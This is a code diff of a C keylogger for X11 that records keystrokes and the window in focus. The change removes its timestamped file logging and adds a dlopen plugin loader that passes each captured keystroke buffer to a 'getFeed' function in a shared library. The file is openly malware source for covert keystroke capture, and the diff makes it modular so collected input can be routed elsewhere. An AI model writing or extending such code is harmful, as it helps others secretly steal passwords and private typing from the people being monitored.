@@ -4,6 +4,7 @@
 #include <time.h>
 #include <stdlib.h>
 #include <string.h>
+#include <dlfcn.h>
 #include "buffer.h"
 
 #define SIZE 1024
@@ -15,6 +16,7 @@ time_t timeout = 0;
 int background = 0;
 int output = 0;
 char *outputfile = "key.log";
+const char *plugins[] = {"mikey-plaintext.so"};
 
 void handleArgs(int argc, char* argv[]) {
 
@@ -38,29 +40,30 @@ void handleArgs(int argc, char* argv[]) {
     }
 }
 
-void log(const char * fmt, ...) {
-
-    va_list va_alist;
-    char buf[2048], logbuf[2048];
-    FILE* file;
-    struct tm* current_tm;
-    time_t current_time;
-    time(&current_time);
-
-    current_tm = localtime (&current_time);
-    sprintf(logbuf, "[%02d:%02d:%02d] ", current_tm->tm_hour, current_tm->tm_min, current_tm->tm_sec);
-
-    va_start(va_alist, fmt);
-    vsprintf(buf, fmt, va_alist);
-    va_end(va_alist);
-
-    strcat(logbuf, buf);
-    strcat(logbuf, "\n");
-
-    if ((file = fopen(outputfile, "a+")) != NULL) {
-        fputs(logbuf, file);
-        fclose(file);
+void *initPlugins(void **hdlarr) {
+     
+    int i;
+    for (i = 0; i < (sizeof(plugins) / sizeof(plugins[0])); i++) {
+        hdlarr[i] =  dlopen (plugins[i], RTLD_NOW);
+        if (!hdlarr[i]) {
+            printf("%s", dlerror());
+        }
     }
+}
+
+void pluginExecute(void **hdlarr, char *function, char *b) {
+    typedef void (*initf)();
+    initf func;
+    char *result;
+
+    func = dlsym(hdlarr[0], function);
+    result = dlerror();
+    if (result) {
+        printf("%s", result);
+    }
+
+    func(b);
+
 }
 
 void addParentheses(char **res) {
@@ -69,8 +72,11 @@ void addParentheses(char **res) {
     sprintf(*res, " (%s) ", tmp);
 }
 
-
 void keylogger() {
+    
+    void *hdlarr[100];
+    initPlugins(hdlarr);
+
     BUFFER *b;
     b = initBuffer();
     Display *display;
@@ -103,7 +109,7 @@ void keylogger() {
 
         if ((logging == 1) && (time(NULL) > timeout)) {
             logging = 0;
-            log(" [%x] %s\n", focusWin, b->buffer);
+            pluginExecute(hdlarr, "getFeed", b->buffer);
             emptyData(b);
         }
             
@@ -153,11 +159,11 @@ void keylogger() {
                         XGetInputFocus(display, &focusWin, &iReverToReturn);
 
                         if (!background) {
-                            printf( "WindowID %x Key: %s Code: %i\n", focusWin, keyboardStateString, keyCode );
+                            printf("WindowID %x Key: %s Code: %i\n", focusWin, keyboardStateString, keyCode);
                         }
 
                         if (focusWin != oldfocusWin) {
-                            log("[window changed] %s\n", b->buffer);
+                            pluginExecute(hdlarr, "getFeed", b->buffer);
                             emptyData(b);
                         }
 
